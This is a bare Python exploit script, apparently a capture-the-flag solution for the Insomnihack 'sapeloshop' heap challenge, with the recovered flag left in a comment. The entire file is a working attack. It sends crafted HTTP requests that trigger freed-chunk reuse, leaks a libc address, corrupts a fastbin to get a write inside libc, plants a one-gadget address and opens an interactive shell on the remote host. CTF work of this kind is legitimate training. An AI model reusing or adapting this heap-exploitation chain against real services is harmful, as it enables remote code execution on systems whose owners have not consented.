from pwnlib import *

# INS{sapeurs_are_the_real_heapsters}

getreq = """GET /cart HTTP/1.1
Host: 127.0.0.1:31337
Connection: keep-alive

""".replace("\n", "\r\n")

req = """POST /%s HTTP/1.1
Host: 127.0.0.1:31337
Content-Type: application/x-www-form-urlencoded
Content-Length: %d
Connection: keep-alive

%s""".replace("\n", "\r\n")

def encode(text):
    return "%" + "%".join(c.encode("hex") for c in text)

def add(text, result=True):
    text = "desc=" + text
    s.send(req % ("add", len(text), text))
    if result:
        s.ru("</html>\n")

def sub(i):
    text = "item=" + str(i)
    s.send(req % ("sub", len(text), text))
    s.ru("</html>\n")

def inc(i):
    text = "item=" + str(i)
    s.send(req % ("inc", len(text), text))
    s.ru("</html>\n")

def get(result=True):
    s.send(getreq)
    if result:
        return s.ru("</html>\n")

#s = Socket(("localhost", 1610))
s = Socket(("sapeloshop.teaser.insomnihack.ch", 80))



##### leak a libc ptr #####

add("0"*0x100)
add("1"*0x100)


sub(1)
inc(1)

get(result=False)
s.ru("dopost('sub','0')")
s.ru('<img src="img/')
leaked = s.ru('" style="height')

addr = uq(leaked.ljust(8, chr(0)))
libc_base = addr - 0x3c4b78
assert libc_base & 0xfff == 0
s.ru("</html>\n")

print "libc: 0x%x" % libc_base


##### corrupt fastbin chunk #####


add("2"*0x60)
add("3"*0x60)
add("4"*0x60)


raw_input("> ")

sub(2)
inc(2)

sub(3)

sub(2)

fake_chunk_addr = libc_base + 0x3c4aed


payload  = ""
payload += pq(fake_chunk_addr)
payload += pq(0xcafebabe)
payload  = encode(payload)
payload += "X"*(0x60 - len(payload))

add(payload) # overwrites old fastchunk

add("6"*0x60)

add("7"*0x60) 

payload  = ""
payload += pattern(19)
payload += pq(libc_base + 0x0F02A4 )
payload  = encode(payload)
payload += "X"*(0x60 - len(payload))

add(payload)
add("9"*0x60, result=False)





s.interact()

